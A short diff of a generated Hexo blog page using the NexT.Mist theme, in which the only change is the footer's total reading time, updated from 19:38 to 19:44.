@@ -2577,7 +2523,7 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">19:38</span>
+    <span title="Reading time total">19:44</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
